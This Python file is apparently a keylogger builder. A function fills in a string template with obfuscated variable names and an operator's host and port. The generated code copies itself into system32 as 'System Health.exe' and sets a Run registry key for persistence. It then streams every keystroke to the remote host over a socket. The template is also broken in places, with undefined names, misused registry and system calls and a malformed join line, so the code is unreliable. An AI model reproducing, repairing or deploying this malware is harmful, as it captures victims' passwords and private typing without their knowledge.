from winreg import OpenKey, SetValueEx

def Create(*self, Host, Port):

    KeyLogger_Data = """  
from winreg import OpenKey , SetValueEx
from pynput.keyboard import Key, Listener
import logging
from os import system

def {a1}() :
    {a2} = str(__file__)
    {a3} = open({a2} , "rb")
    {a4} = {a3}.read()
    {a3}.close()
    {a5} = r"C:\Windows\system32\System Health.exe"
    {a6} = open({a5} , "wb") 
    {a6}.write(payload)
    {a6}.close()
    system({a6})
    {a7}="Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    {a8} = OpenKey("HKEY_LOCAL_MACHINE",{a7},0,"KEY_ALL_ACCESS")
    SetValueEx(key, "System Health",0,"REG_SZ", {a5})
    
def {a13}({a9}):
    global {a10}
    {a10} += {a9}
    {a11}.send({a10}.encode('UTF-8'))

    
if __name__ == "__main__":
    {a10} = ""
    {a1}()
    import socket 
    {a12} = False
    while not {a12} :
        try :
           {a11} = socket.socket()
           port = {p} 
           host = "{h}"
           {a11}.connect((host , port)) 
           {a12} = True 
        except :
           {a12} = False
    while {a12} :
        try : 
            with Listener(on_press={a13}) as {a14}:
                a{14}.join()
        except :
            {a12} = False
            """.format(a1=a1, a2=a2, a3=a3, a4=a4, a5=a5, a6=a6, a7=a7, a8=a8, a9=a9,
                       a10=a10, a11=a11, a12=a12, a13=a13, a14=a14)

    return KeyLogger_Data
